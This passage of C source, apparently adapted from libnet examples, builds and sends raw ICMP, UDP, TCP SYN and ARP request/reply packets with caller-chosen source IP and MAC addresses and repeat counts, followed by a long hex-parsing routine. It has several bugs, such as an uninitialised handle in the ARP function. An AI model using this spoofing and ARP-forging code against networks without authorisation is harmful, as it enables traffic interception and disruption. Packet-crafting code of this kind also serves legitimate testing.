    gen = (Gen *) ptr;  /* type cast to a pointer to thdata */
	strcpy(error,"");
    printf("libnet 1.1 packet shaping: ICMP[RAW using context queue]\n");
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);

	//src_ip = libnet_name2addr4(l,sip,LIBNET_RESOLVE);
    //dst_ip= libnet_name2addr4(l,dip,LIBNET_RESOLVE);

    if (!gen->src_ip || !gen->dst_ip)
    {
        //usage(argv[0]);
        exit(EXIT_FAILURE);
    }

   
    for (i = 0; i < gen->count; i++)
    {
        l = libnet_init(
                LIBNET_RAW4,                  /* injection type */
                gen->device,                       /* network interface */
                errbuf);                      /* errbuf */

        if (l == NULL)
        {
            /* we should run through the queue and free any stragglers */
            sprintf(error, "libnet_init() failed: %s", errbuf);
            errx(1,error);
        }
        /*
         *  Since we need a libnet context for address resolution it is
         *  necessary to put this inside the loop.
         */
       if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
    if ((src_ip = libnet_name2addr4(l,gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
    }

        t = libnet_build_icmpv4_echo(
            ICMP_ECHO,                            /* type */
            0,                                    /* code */
            0,                                    /* checksum */
            0x42,                                 /* id */
            0x42,                                 /* sequence number */
            NULL,                                 /* payload */
            0,                                    /* payload size */
            l,                                    /* libnet handle */
            0);
        if (t == -1)
        {
            sprintf(error, "Can't build ICMP header: %s",libnet_geterror(l));
            goto bad_icmp_echo_cq;
        }

        t = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H + gen->payload_s, /* length */
            0,                                    /* TOS */
            0x42,                                 /* IP ID */
            0,                                    /* IP Frag */
            64,                                   /* TTL */
            IPPROTO_ICMP,                         /* protocol */
            0,                                    /* checksum */
            src_ip,                               /* source IP */
            dst_ip,                               /* destination IP */
            payload,                              /* payload */
            payload_s,                            /* payload size */
            l,                                    /* libnet handle */
            0);
        if (t == -1)
        {
            sprintf(error, "Can't build IP header: %s", libnet_geterror(l));
            goto bad_icmp_echo_cq;
        }

        /* and finally, put it in the context queue */
        snprintf(label, sizeof(label)-1, "echo %d", i);
        if (libnet_cq_add(l, label) == -1)
        {
            sprintf(error, "add error: %s", libnet_geterror(l));
            goto bad_icmp_echo_cq;
        }
    }

    for_each_context_in_cq(l)
    {
        c = libnet_write(l);
        if (c == -1)
        {
            sprintf(error, "Write error: %s", libnet_geterror(l));
            goto bad_icmp_echo_cq;
        }
        else
        {
            fprintf(stderr, "Wrote %d byte ICMP packet from context \"%s\"; "
                    "check the wire.\n", c, libnet_cq_getlabel(l));
        }
  }

    libnet_cq_destroy();
    return (EXIT_SUCCESS);
bad_icmp_echo_cq:
    libnet_cq_destroy();
    libnet_destroy(l);
	errx(1,error);
    return (EXIT_FAILURE);
}

int udp(void *ptr)
{
    int c, i, j, build_ip;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t ip, ipo;
    libnet_ptag_t udp;
    char *payload;
    u_short payload_s;
    struct libnet_stats ls;
    u_long src_ip, dst_ip;
    u_short src_prt, dst_prt;
    u_char opt[20];
    char errbuf[LIBNET_ERRBUF_SIZE];
	Gen *gen;            
    gen = (Gen *) ptr;  /* type cast to a pointer to thdata */

    printf("libnet 1.1 packet shaping: UDP + IP options[raw]\n"); 

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            gen->device,                                   /* network interface */
            errbuf);                                /* errbuf */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    src_ip  = 0;
    dst_ip  = 0;
    src_prt = 33;
    dst_prt = 55;
    payload = NULL;
    payload_s = 0;
    ip = ipo = udp = 0;
   
                if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
                {
                    fprintf(stderr, "Bad destination IP address: %s\n", "1.1.1.1");                    exit(EXIT_FAILURE);
                }
           
                if ((src_ip = libnet_name2addr4(l, gen->src_ip, LIBNET_RESOLVE)) == -1)
                {
                    fprintf(stderr, "Bad source IP address: %s\n", "1.1.1.1");
                    exit(EXIT_FAILURE);
                }
             

    for (build_ip = 0, i = 0; i < gen->count; i++)
    {
        udp = libnet_build_udp(
            gen->src_prt,                                /* source port */
            gen->dst_prt,                            /* destination port */
            LIBNET_UDP_H + gen->payload_s,               /* packet length */
            0,                                      /* checksum */
            gen->payload,                                /* payload */
            gen->payload_s,                              /* payload size */
            l,                                      /* libnet handle */
            udp);                                   /* libnet id */
        if (udp == -1)
        {
            fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
            goto bad2;
        }

        if (1)
        {
            build_ip = 0;
            /* this is not a legal options string */
            for (j = 0; j < 20; j++)
            {
                opt[j] = libnet_get_prand(LIBNET_PR2);
            }
            ipo = libnet_build_ipv4_options(
                opt,
                20,
                l,
                ipo);
            if (ipo == -1)
            {
                fprintf(stderr, "Can't build IP options: %s\n", libnet_geterror(l));
                goto bad2;
            }

            ip = libnet_build_ipv4(
                LIBNET_IPV4_H + 20 + gen->payload_s + LIBNET_UDP_H, /* length */
                0,                                          /* TOS */
                242,                                        /* IP ID */
                0,                                          /* IP Frag */
                64,                                         /* TTL */
                IPPROTO_UDP,                                /* protocol */
                0,                                          /* checksum */
                src_ip,
                dst_ip,
                NULL,                                       /* payload */
                0,                                          /* payload size */
                l,                                          /* libnet handle */
               ip);                                         /* libnet id */
            if (ip == -1)
            {
                fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
                goto bad2;
            }
        }

        /*
         *  Write it to the wire.
         */
        fprintf(stderr, "%d byte packet, ready to go\n",
            libnet_getpacket_size(l));
        c = libnet_write(l);
        if (c == -1)
        {
            fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
            goto bad2;
        }
        else
        {
            fprintf(stderr, "Wrote %d byte UDP packet; check the wire.\n", c);
        }
    }
    libnet_stats(l, &ls);
    fprintf(stderr, "Packets sent:  %lld\n"
                    "Packet errors: %lld\n"
                    "Bytes written: %lld\n",
                    ls.packets_sent, ls.packet_errors, ls.bytes_written);
    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad2:
    libnet_destroy(l);
    return (EXIT_FAILURE);
	}



int tcp(void *ptr)
{
    int c,i;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char *payload;
    u_short payload_s;
    u_long src_ip, dst_ip;
    u_short src_prt, dst_prt;
    char errbuf[LIBNET_ERRBUF_SIZE];
	Gen *gen;            
    gen = (Gen *) ptr;  /* type cast to a pointer to thdata */

    printf("libnet 1.1 packet shaping: TCP + options[link]\n");

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            gen->device,                                   /* network interface */
            errbuf);                                /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
	
    src_ip  = 0;
    dst_ip  = 0;
    src_prt = 33;
    dst_prt = 55;
    payload = NULL;
    payload_s = 0;

	   if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
                {
                    fprintf(stderr, "Bad destination IP address: %s\n", "1.1.1.1");
                    exit(EXIT_FAILURE);
                }
              
         
                if ((src_ip = libnet_name2addr4(l, gen->src_ip, LIBNET_RESOLVE)) == -1)
                {
                    fprintf(stderr, "Bad source IP address: %s\n", "2.2.2.2");
                    exit(EXIT_FAILURE);
                }
  
    t = libnet_build_tcp_options(
        "\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000",
        20,
        l,
        0);
    if (t == -1)
    {
        fprintf(stderr, "Can't build TCP options: %s\n", libnet_geterror(l));
        goto bad;
    }

    t = libnet_build_tcp(
        gen->src_prt,                                    /* source port */
        gen->dst_prt,                                    /* destination port */
        0x01010101,                                 /* sequence number */
        0x02020202,                                 /* acknowledgement num */
        TH_SYN,                                     /* control flags */
        32767,                                      /* window size */
        0,                                          /* checksum */
        10,                                          /* urgent pointer */
        LIBNET_TCP_H + 20 + gen->payload_s,              /* TCP packet size */
	    gen->payload,                                    /* payload */
        gen->payload_s,                                  /* payload size */
        l,                                          /* libnet handle */
        0);                                         /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
        goto bad;
    }
	
    t = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,/* length */
      	0,                                          /* TOS */
        242,                                        /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_TCP,                                /* protocol */
        0,                                          /* checksum */
        src_ip,                                     /* source IP */
        dst_ip,                                     /* destination IP */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);                                         /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
        goto bad;
    }
  
   // t = libnet_build_ethernet(
  //     enet_dst,                                   /* ethernet destination */
   //     enet_src,                                   /* ethernet source */
    //    ETHERTYPE_IP,                               /* protocol type */
   //     NULL,                                       /* payload */
    //    0,                                          /* payload size */
    //    l,                                          /* libnet handle */
    //    0);                                         /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
        goto bad;
    }
	
    /*
     *  Write it to the wire.
     */
     for (i = 0; i<gen->count; i++) c = libnet_write(l);
    if (c == -1)
    {
        fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
        goto bad;
   }
   else
   {
       fprintf(stderr, "Wrote %d byte TCP packet; check the wire.\n", c);
   }

    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
}



int arp( void *ptr ) 
{ 
   
	

    //char temp_smac2[4];
    //char temp_smac3[4]; t = libnet_build_tcp_options( 
      
    //char temp_smac4[4];
    //char temp_smac5[4];
    //char temp_smac6[4];
    //struct generate gen;
    
    //printf("%s\n",temp_smac1);
    
    int c,i,lenght; 
    u_int32_t  s,d; 
    libnet_t *l; 
    libnet_ptag_t t; 
	u_int8_t *packet;
    u_int32_t packet_s;
	int Type;
	char errbuf[LIBNET_ERRBUF_SIZE]; 
	char error[100];
	Gen *gen;            
    gen = (Gen *) ptr;  /* type cast to a pointer to thdata */
	
 
   
    

	//gen = gen2; 
	strcpy(error,"");
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);

	if (  (lenght =strlen(gen->src_mac))!= 24 )
			errx(1, "Source Mac address Error ");
	
	if (  (lenght =strlen(gen->dst_mac))!= 24 )
			errx(1, "Destination Mac address Error ");

	change_mac(gen->src_mac,0);
	change_mac(gen->dst_mac,1);

	


     if ((d = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s",gen->dst_ip);
	errx(1,error);
	//exit(EXIT_FAILURE);
    }
    
    if ((s = libnet_name2addr4(l, gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
	//exit(EXIT_FAILURE);
    }
   
   printf("libnet 1.1 packet shaping: ARP[link -- autobuilding ethernet]\n");

   if (strcmp(gen->type,"reply")==0)
   {
		Type = ARPOP_REPLY;
   }
   else if ((strcmp(gen->type,"request")==0))
   {
	   Type = ARPOP_REQUEST;
   } else  {
		sprintf(error, "Type arp error %s", gen->type);
		errx(1,error);
		//exit(EXIT_FAILURE);
    }

   l = libnet_init(
            LIBNET_LINK_ADV,                        /* injection type */
            gen->device,                                 /* network interface */
            errbuf);                                /* errbuf */

    if (l == NULL)
    {
        sprintf(error, "%s", errbuf);
		errx(1,error);
       // exit(EXIT_FAILURE);
    }
	else
	 
    //i = libnet_get_ipaddr4(l);
  
    t = libnet_build_arp(
            ARPHRD_ETHER,                           /* hardware addr */
            ETHERTYPE_IP,                           /* protocol addr */
            6,                                      /* hardware addr size */
            4,                                      /* protocol addr size */
            Type,                            /* operation type */
            enet_src,                               /* sender hardware addr */
			(u_int8_t *)&s,                         /* sender protocol addr */
            enet_dst,                               /* target hardware addr */
            (u_int8_t *)&d,                         /* target protocol addr */
            NULL,                                   /* payload */
            0,                                      /* payload size */
            l,                                      /* libnet context */
            0);                                     /* libnet id */
    if (t == -1)
    {
        sprintf(error, "Can't build ARP header: %s", libnet_geterror(l));
		goto bad_arp;
    }

    t = libnet_autobuild_ethernet(
            enet_dst,                               /* ethernet destination */
            ETHERTYPE_ARP,                          /* protocol type */
            l);                                     /* libnet handle */
    if (t == -1)
    {
        sprintf(error, "Can't build ethernet header: %s",
        libnet_geterror(l));
        goto bad_arp;
    }


    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else
    {
        fprintf(stderr, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }

	  for (i = 0; i<gen->count; i++) {
    c = libnet_write(l);

    if (c == -1)
    {
        sprintf(error, "Write error: %s", libnet_geterror(l));
        goto bad_arp;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte ARP packet from context \"%s\"; "
                "check the wire.\n", c, libnet_cq_getlabel(l));
    }
	  }
    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad_arp:
    libnet_destroy(l);
	errx(1,error);
    return (EXIT_FAILURE);


	//while (1){
		//printf("arp\n");
		// }

	
} 

void change_mac(char *mac,int select)
{
	 int i=0,k=0,count=0;
	  u_char temp;
	 char temp_smac[5]="";
		//printf("%s \n",mac);

	
	 if (mac != NULL)//strcmp(smac,NULL) != 0)
	 {
	 	 for (k=0;k<6;k++)
	 	 {
	 		count= k * 4;
			for (i=0;i<4 ;i++ )
			{
				temp_smac[i] = mac[count+i];
			}		 


			 if (strcmp(temp_smac,"0x00") == 0)
			 {
				 temp = 0x00;
				 
			 }
			if (strcmp(temp_smac,"0x01") == 0)
			 {
				 temp = 0x01;
				 
			 }
			 if (strcmp(temp_smac,"0x02") == 0)
			 {
				 temp = 0x02;
				 
			 }
			 if (strcmp(temp_smac,"0x03") == 0)
			 {
				 temp = 0x03;
				 
			 }
			 if (strcmp(temp_smac,"0x04") == 0)
			 {
				 temp = 0x04;
				 
			 }
			 if (strcmp(temp_smac,"0x05") == 0)
			 {
				 temp = 0x05;
				 
			 }
			 if (strcmp(temp_smac,"0x06") == 0)
			 {
				 temp = 0x06;
				 
			 }
			 if (strcmp(temp_smac,"0x07") == 0)
			 {
				 temp = 0x07;
				 
			 }
			 if (strcmp(temp_smac,"0x08") == 0)
			 {
				 temp = 0x08;
				 
			 }
			 if (strcmp(temp_smac,"0x09") == 0)
			 {
				 temp = 0x09;
				 
			 }
			 if (strcmp(temp_smac,"0x0a") == 0)
			 {
				 temp = 0x0a;
				 
			 }if (strcmp(temp_smac,"0x0b") == 0)
			 {
				 temp = 0x0b;
				 
			 }if (strcmp(temp_smac,"0x0c") == 0)
			 {
				 temp = 0x0c;
				 
			 }if (strcmp(temp_smac,"0x0d") == 0)
			 {
				 temp = 0x0d;
				 
			 }if (strcmp(temp_smac,"0x0e") == 0)
			 {
				 temp = 0x0e;
				 
			 }if (strcmp(temp_smac,"0x0f") == 0)
			 {
				 temp = 0x0f;
				 
			 }

			 if (strcmp(temp_smac,"0x10") == 0)
			 {
				 temp = 0x10;
				 
			 }if (strcmp(temp_smac,"0x11") == 0)
			 {
				 temp = 0x11;
				 
			 }if (strcmp(temp_smac,"0x12") == 0)
			 {
				 temp = 0x12;
				 
			 }if (strcmp(temp_smac,"0x13") == 0)
			 {
				 temp = 0x13;
				 
			 }if (strcmp(temp_smac,"0x14") == 0)
			 {
				 temp = 0x14;
				 
			 }if (strcmp(temp_smac,"0x15") == 0)
			 {
				 temp = 0x15;
				 
			 }if (strcmp(temp_smac,"0x16") == 0)
			 {
				 temp = 0x16;
				 
			 }if (strcmp(temp_smac,"0x17") == 0)
			 {
				 temp = 0x17;
				 
			 }if (strcmp(temp_smac,"0x18") == 0)
			 {
				 temp = 0x18;
				 
			 }if (strcmp(temp_smac,"0x19") == 0)
			 {
				 temp = 0x19;
				 
			 }
			 if (strcmp(temp_smac,"0x1a") == 0)
			 {
				 temp = 0x1a;
				 
			 }if (strcmp(temp_smac,"0x1b") == 0)
			 {
				 temp = 0x1b;
				 
			 }if (strcmp(temp_smac,"0x1c") == 0)
			 {
				 temp = 0x1c;
				 
			 }if (strcmp(temp_smac,"0x1d") == 0)
			 {
				 temp = 0x1d;
				 
			 }if (strcmp(temp_smac,"0x1e") == 0)
			 {
				 temp = 0x1e;
				 
			 }if (strcmp(temp_smac,"0x1f") == 0)
			 {
				 temp = 0x1f;
				 
			 }

		if (strcmp(temp_smac,"0x20") == 0)
			 {
				 temp = 0x20;
				 
			 }if (strcmp(temp_smac,"0x21") == 0)
			 {
				 temp = 0x21;
				 
			 }if (strcmp(temp_smac,"0x22") == 0)
			 {
				 temp = 0x22;
				 
			 }if (strcmp(temp_smac,"0x23") == 0)
			 {
				 temp = 0x23;
				 
			 }if (strcmp(temp_smac,"0x24") == 0)
			 {
				 temp = 0x24;
				 
			 }if (strcmp(temp_smac,"0x25") == 0)
			 {
				 temp = 0x25;
				 
			 }if (strcmp(temp_smac,"0x26") == 0)
			 {
				 temp = 0x26;
				 
			 }if (strcmp(temp_smac,"0x27") == 0)
			 {
				 temp = 0x27;
				 
			 }if (strcmp(temp_smac,"0x28") == 0)
			 {
				 temp = 0x28;
				 
			 }if (strcmp(temp_smac,"0x29") == 0)
			 {
				 temp = 0x29;
				 
			 }
			 if (strcmp(temp_smac,"0x2a") == 0)
			 {
				 temp = 0x2a;
				 
			 }if (strcmp(temp_smac,"0x2b") == 0)
			 {
				 temp = 0x2b;
				 
			 }if (strcmp(temp_smac,"0x2c") == 0)
			 {
				 temp = 0x2c;
				 
			 }if (strcmp(temp_smac,"0x2d") == 0)
			 {
				 temp = 0x2d;
				 
			 }if (strcmp(temp_smac,"0x2e") == 0)
			 {
				 temp = 0x2e;
				 
			 }if (strcmp(temp_smac,"0x2f") == 0)
			 {
				 temp = 0x2f;
				 
			 }

			 if (strcmp(temp_smac,"0x30") == 0)
			 {
				 temp = 0x30;
				 
			 }if (strcmp(temp_smac,"0x31") == 0)
			 {
				 temp = 0x31;
				 
			 }if (strcmp(temp_smac,"0x32") == 0)
			 {
				 temp = 0x32;
				 
			 }if (strcmp(temp_smac,"0x33") == 0)
			 {
				 temp = 0x33;
				 
			 }if (strcmp(temp_smac,"0x34") == 0)
			 {
				 temp = 0x34;
				 
			 }if (strcmp(temp_smac,"0x35") == 0)
			 {
				 temp = 0x35;
				 
			 }if (strcmp(temp_smac,"0x36") == 0)
			 {
				 temp = 0x36;
				 
			 }if (strcmp(temp_smac,"0x37") == 0)
			 {
				 temp = 0x37;
				 
			 }if (strcmp(temp_smac,"0x38") == 0)
			 {
				 temp = 0x38;
				 
			 }if (strcmp(temp_smac,"0x39") == 0)
			 {
				 temp = 0x39;
				 
			 }
			 if (strcmp(temp_smac,"0x3a") == 0)
			 {
				 temp = 0x3a;
				 
			 }if (strcmp(temp_smac,"0x3b") == 0)
			 {
				 temp = 0x3b;
				 
			 }if (strcmp(temp_smac,"0x3c") == 0)
			 {
				 temp = 0x3c;
				 
			 }if (strcmp(temp_smac,"0x3d") == 0)
			 {
				 temp = 0x3d;
				 
			 }if (strcmp(temp_smac,"0x3e") == 0)
			 {
				 temp = 0x3e;
				 
			 }if (strcmp(temp_smac,"0x3f") == 0)
			 {
				 temp = 0x3f;
				 
			 }

			 if (strcmp(temp_smac,"0x40") == 0)
			 {
				 temp = 0x40;
				 
			 }if (strcmp(temp_smac,"0x41") == 0)
			 {
				 temp = 0x41;
				 
			 }if (strcmp(temp_smac,"0x42") == 0)
			 {
				 temp = 0x42;
				 
			 }if (strcmp(temp_smac,"0x43") == 0)
			 {
				 temp = 0x43;
				 
			 }if (strcmp(temp_smac,"0x44") == 0)
			 {
				 temp = 0x44;
				 
			 }if (strcmp(temp_smac,"0x45") == 0)
			 {
				 temp = 0x45;
				 
			 }if (strcmp(temp_smac,"0x46") == 0)
			 {
				 temp = 0x46;
				 
			 }if (strcmp(temp_smac,"0x47") == 0)
			 {
				 temp = 0x47;
				 
			 }if (strcmp(temp_smac,"0x48") == 0)
			 {
				 temp = 0x48;
				 
			 }if (strcmp(temp_smac,"0x49") == 0)
			 {
				 temp = 0x49;
				 
			 }
			 if (strcmp(temp_smac,"0x4a") == 0)
			 {
				 temp = 0x4a;
				 
			 }if (strcmp(temp_smac,"0x4b") == 0)
			 {
				 temp = 0x4b;
				 
			 }if (strcmp(temp_smac,"0x4c") == 0)
			 {
				 temp = 0x4c;
				 
			 }if (strcmp(temp_smac,"0x4d") == 0)
			 {
				 temp = 0x4d;
				 
			 }if (strcmp(temp_smac,"0x4e") == 0)
			 {
				 temp = 0x4e;
				 
			 }if (strcmp(temp_smac,"0x4f") == 0)
			 {
				 temp = 0x4f;
				 
			 }
			 
			 if (strcmp(temp_smac,"0x50") == 0)
			 {
				 temp = 0x50;
				 
			 }if (strcmp(temp_smac,"0x51") == 0)
			 {
				 temp = 0x51;
				 
			 }if (strcmp(temp_smac,"0x52") == 0)
			 {
				 temp = 0x52;
				 
			 }if (strcmp(temp_smac,"0x53") == 0)
			 {
				 temp = 0x53;
				 
			 }if (strcmp(temp_smac,"0x54") == 0)
			 {
				 temp = 0x54;
				 
			 }if (strcmp(temp_smac,"0x55") == 0)
			 {
				 temp = 0x55;
				 
			 }if (strcmp(temp_smac,"0x56") == 0)
			 {
				 temp = 0x56;
				 
			 }if (strcmp(temp_smac,"0x57") == 0)
			 {
				 temp = 0x57;
				 
			 }if (strcmp(temp_smac,"0x58") == 0)
			 {
				 temp = 0x58;
				 
			 }if (strcmp(temp_smac,"0x59") == 0)
			 {
				 temp = 0x59;
				 
			 }
			 if (strcmp(temp_smac,"0x5a") == 0)
			 {
				 temp = 0x5a;
				 
			 }if (strcmp(temp_smac,"0x5b") == 0)
			 {
				 temp = 0x5b;
				 
			 }if (strcmp(temp_smac,"0x5c") == 0)
			 {
				 temp = 0x5c;
				 
			 }if (strcmp(temp_smac,"0x5d") == 0)
			 {
				 temp = 0x5d;
				 
			 }if (strcmp(temp_smac,"0x5e") == 0)
			 {
				 temp = 0x5e;
				 
			 }if (strcmp(temp_smac,"0x5f") == 0)
			 {
				 temp = 0x5f;
				 
			 }
	
			 if (strcmp(temp_smac,"0x60") == 0)
			 {
				 temp = 0x60;
				 
			 }if (strcmp(temp_smac,"0x61") == 0)
			 {
				 temp =0x61;
				 
			 }if (strcmp(temp_smac,"0x62") == 0)
			 {
				 temp = 0x62;
				 
			 }if (strcmp(temp_smac,"0x63") == 0)
			 {
				 temp = 0x63;
				 
			 }if (strcmp(temp_smac,"0x64") == 0)
			 {
				 temp = 0x64;
				 
			 }if (strcmp(temp_smac,"0x65") == 0)
			 {
				 temp = 0x65;
				 
			 }if (strcmp(temp_smac,"0x66") == 0)
			 {
				 temp = 0x66;
				 
			 }if (strcmp(temp_smac,"0x67") == 0)
			 {
				 temp = 0x67;
				 
			 }if (strcmp(temp_smac,"0x68") == 0)
			 {
				 temp = 0x68;
				 
			 }if (strcmp(temp_smac,"0x69") == 0)
			 {
				 temp = 0x69;
				 
			 }
			 if (strcmp(temp_smac,"0x6a") == 0)
			 {
				 temp = 0x6a;
				 
			 }if (strcmp(temp_smac,"0x6b") == 0)
			 {
				 temp = 0x6b;
				 
			 }if (strcmp(temp_smac,"0x6c") == 0)
			 {
				 temp = 0x6c;
				 
			 }if (strcmp(temp_smac,"0x6d") == 0)
			 {
				 temp = 0x6d;
				 
			 }if (strcmp(temp_smac,"0x6e") == 0)
			 {
				 temp = 0x6e;
				 
			 }if (strcmp(temp_smac,"0x6f") == 0)
			 {
				 temp = 0x6f;
				 
			 }
		 
			 if (strcmp(temp_smac,"0x70") == 0)
			 {
				 temp = 0x70;
				 
			 }if (strcmp(temp_smac,"0x71") == 0)
			 {
				 temp = 0x71;
				 
			 }if (strcmp(temp_smac,"0x72") == 0)
			 {
				 temp = 0x72;
				 
			 }if (strcmp(temp_smac,"0x73") == 0)
			 {
				 temp = 0x73;
				 
			 }if (strcmp(temp_smac,"0x74") == 0)
			 {
				 temp = 0x74;
				 
			 }if (strcmp(temp_smac,"0x75") == 0)
			 {
				 temp = 0x75;
				 
			 }if (strcmp(temp_smac,"0x76") == 0)
			 {
				 temp = 0x76;
				 
			 }if (strcmp(temp_smac,"0x77") == 0)
			 {
				 temp = 0x77;
				 
			 }if (strcmp(temp_smac,"0x78") == 0)
			 {
				 temp = 0x78;
				 
			 }if (strcmp(temp_smac,"0x79") == 0)
			 {
				 temp = 0x79;
				 
			 }
			 if (strcmp(temp_smac,"0x7a") == 0)
			 {
				 temp = 0x7a;
				 
			 }if (strcmp(temp_smac,"0x7b") == 0)
			 {
				 temp = 0x7b;
				 
			 }if (strcmp(temp_smac,"0x7c") == 0)
			 {
				 temp = 0x7c;
				 
			 }if (strcmp(temp_smac,"0x7d") == 0)
			 {
				 temp = 0x7d;
				 
			 }if (strcmp(temp_smac,"0x7e") == 0)
			 {
				 temp = 0x7e;
				 
			 }if (strcmp(temp_smac,"0x7f") == 0)
			 {
				 temp = 0x7f;
				 
			 }
		 
			 if (strcmp(temp_smac,"0x80") == 0)
			 {
				 temp = 0x80;
				 
			 }if (strcmp(temp_smac,"0x81") == 0)
			 {
				 temp = 0x81;
				 
			 }if (strcmp(temp_smac,"0x82") == 0)
			 {
				 temp = 0x82;
				 
			 }if (strcmp(temp_smac,"0x83") == 0)
			 {
				 temp = 0x83;
				 
			 }if (strcmp(temp_smac,"0x84") == 0)
			 {
				 temp = 0x84;
				 
			 }if (strcmp(temp_smac,"0x85") == 0)
			 {
				 temp = 0x85;
				 
			 }if (strcmp(temp_smac,"0x86") == 0)
			 {
				 temp = 0x86;
				 
			 }if (strcmp(temp_smac,"0x87") == 0)
			 {
				 temp = 0x87;
				 
			 }if (strcmp(temp_smac,"0x88") == 0)
			 {
				 temp = 0x88;
				 
			 }if (strcmp(temp_smac,"0x89") == 0)
			 {
				 temp = 0x89;
				 
			 }
			 if (strcmp(temp_smac,"0x8a") == 0)
			 {
				 temp = 0x8a;
				 
			 }if (strcmp(temp_smac,"0x8b") == 0)
			 {
				 temp = 0x8b;
				 
			 }if (strcmp(temp_smac,"0x8c") == 0)
			 {
				 temp = 0x8c;
				 
			 }if (strcmp(temp_smac,"0x8d") == 0)
			 {
				 temp = 0x8d;
				 
			 }if (strcmp(temp_smac,"0x8e") == 0)
			 {
				 temp = 0x8e;
				 
			 }if (strcmp(temp_smac,"0x8f") == 0)
			 {
				 temp = 0x8f;
				 
			 }


			if (strcmp(temp_smac,"0x90") == 0)
			 {
				 temp = 0x90;
				 
			 }
			 if (strcmp(temp_smac,"0x91") == 0)
			 {
				 temp = 0x91;
				 
			 }
			 if (strcmp(temp_smac,"0x92") == 0)
			 {
				 temp = 0x92;
				 
			 }
			 if (strcmp(temp_smac,"0x93") == 0)
			 {
				 temp = 0x93;
				 
			 }
			 if (strcmp(temp_smac,"0x94") == 0)
			 {
				 temp = 0x94;
				 
			 }
			 if (strcmp(temp_smac,"0x95") == 0)
			 {
				 temp = 0x95;
				 
			 }
			 if (strcmp(temp_smac,"0x96") == 0)
			 {
				 temp = 0x96;
				 
			 }
			 if (strcmp(temp_smac,"0x97") == 0)
			 {
				 temp = 0x97;
				 
			 }
			 if (strcmp(temp_smac,"0x98") == 0)
			 {
				 temp = 0x98;
				 
			 }
			 if (strcmp(temp_smac,"0x99") == 0)
			 {
				 temp = 0x99;
				 
			 }
			 if (strcmp(temp_smac,"0x9a") == 0)
			 {
				 temp = 0x9a;
				 
			 }
			 if (strcmp(temp_smac,"0x9b") == 0)
			 {
				 temp = 0x9b;
				 
			 }
			 if (strcmp(temp_smac,"0x9c") == 0)
			 {
				 temp = 0x9c;
				 
			 }
			 if (strcmp(temp_smac,"0x9d") == 0)
			 {
				 temp = 0x9d;
				 
			 }
			 if (strcmp(temp_smac,"0x9e") == 0)
			 {
				 temp = 0x9e;
				 
			 }
			 if (strcmp(temp_smac,"0x9f") == 0)
			 {
				 temp = 0x9f;
				 
			 }
			 
			 if (strcmp(temp_smac,"0xa0") == 0)
			 {
				 temp = 0xa0;
				 
			 }if (strcmp(temp_smac,"0xa1") == 0)
			 {
				 temp = 0xa1;
				 
			 }if (strcmp(temp_smac,"0xa2") == 0)
			 {
				 temp = 0xa2;
				 
			 }if (strcmp(temp_smac,"0xa3") == 0)
			 {
				 temp = 0xa3;
				 
			 }if (strcmp(temp_smac,"0xa4") == 0)
			 {
				 temp = 0xa4;
				 
			 }if (strcmp(temp_smac,"0xa5") == 0)
			 {
				 temp = 0xa5;
				 
			 }if (strcmp(temp_smac,"0xa6") == 0)
			 {
				 temp = 0xa6;
				 
			 }if (strcmp(temp_smac,"0xa7") == 0)
			 {
				 temp = 0xa7;
				 
			 }if (strcmp(temp_smac,"0xa8") == 0)
			 {
				 temp = 0xa8;
				 
			 }if (strcmp(temp_smac,"0xa9") == 0)
			 {
				 temp = 0xa9;
				 
			 }
			 if (strcmp(temp_smac,"0xaa") == 0)
			 {
				 temp = 0xaa;
				 
			 }if (strcmp(temp_smac,"0xab") == 0)
			 {
